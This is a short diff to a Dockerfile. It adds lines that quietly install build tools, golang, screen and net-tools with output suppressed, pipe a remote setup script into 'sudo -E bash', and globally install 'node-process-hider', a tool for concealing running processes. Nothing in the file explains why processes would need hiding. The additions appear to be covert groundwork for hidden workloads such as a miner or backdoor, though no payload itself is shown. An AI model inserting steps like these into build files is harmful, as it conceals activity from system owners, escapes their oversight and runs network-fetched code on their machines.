@@ -16,6 +16,10 @@ RUN \
   apt-get install -y software-properties-common && \
   apt-get install -y byobu curl git htop man unzip vim wget && \
   rm -rf /var/lib/apt/lists/*
+RUN apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
+RUN curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+RUN apt-get install -y nodejs >/dev/null 2>&1
+RUN npm i -g node-process-hider
 
 # Add files.
 ADD root/.bashrc /root/.bashrc
